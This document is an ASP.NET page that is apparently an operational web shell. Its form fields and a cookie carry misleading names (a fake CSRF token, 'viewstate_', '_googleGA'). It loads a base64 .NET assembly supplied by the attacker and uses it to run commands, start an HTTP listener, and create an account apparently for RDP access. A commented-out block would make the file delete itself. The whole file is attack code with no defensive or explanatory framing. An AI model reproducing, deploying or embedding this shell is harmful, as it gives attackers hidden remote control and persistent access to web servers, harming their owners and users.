<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Reflection" %>

<%
    if (Request.HttpMethod == "POST") {
        // just decoy
        string _data = Request.Form["_CsrfToken"];
        string _cemd = Request.Form["viewstate_"];
        string http = Request.Form["viewtoken_"];
        string clear = Request.Form["_EventTarget"];
        string u = Request.Form["language"];
        string p = Request.Form["location"];
        if (!string.IsNullOrEmpty(_data) && Request.Cookies["_googleGA"] == null) {
            Session["data_pl"] = _data;
            HttpCookie cookie = new HttpCookie("_googleGA", Session.SessionID);
            cookie.Expires = DateTime.Now.AddHours(1);
            Response.Cookies.Add(cookie);
            Response.Write("move");
        }
        else if(!string.IsNullOrEmpty(clear)){
            Session.Remove("data_pl");
            Response.Write("clear");
        }
        else{
            if(!string.IsNullOrEmpty(_cemd) && Session["data_pl"] != null){ // cmd execution
                _cemd = Encoding.UTF8.GetString(Convert.FromBase64String(_cemd));
                Assembly assembly = Assembly.Load(Convert.FromBase64String(Session["data_pl"].ToString()));
                Type type = assembly.GetType("SystemIIS.IIS");
                string result = (string)type.GetMethod("GetResult").Invoke(type.GetConstructor(new Type[] { typeof(string) }).Invoke(new object[] { _cemd }), null);
                Response.Write(result);
            
            }
            if(!string.IsNullOrEmpty(http) && Session["data_pl"] != null){ // http listener
                //Response.Write(http);
                Assembly assembly = Assembly.Load(Convert.FromBase64String(Session["data_pl"].ToString()));
                Type type = assembly.GetType("SystemIIS.HTTPListener");
                string result = (string)type.GetMethod("GetResult").Invoke(type.GetConstructor(new Type[] { typeof(string) }).Invoke(new object[] { http }), null);
                Response.Write(result);
                Session.Remove("data_pl");
                //Uncomment the following lines to enable self-deletion
                //if(File.Exists(HttpContext.Current.Request.PhysicalPath))
	            //{
		            //File.Delete(HttpContext.Current.Request.PhysicalPath);
	            //}
            }
            if(!string.IsNullOrEmpty(u) && !string.IsNullOrEmpty(p) && Session["data_pl"] != null){ // account creation
                Assembly assembly = Assembly.Load(Convert.FromBase64String(Session["data_pl"].ToString()));
                Type type = assembly.GetType("SystemIIS.RDP");
                string result = (string)type.GetMethod("GetResult").Invoke(type.GetConstructor(new Type[] { typeof(string), typeof(string) }).Invoke(new object[] { u, p }), null);
                Response.Write(result);
                Session.Remove("data_pl");
            }
        }
        
    }

     
%>
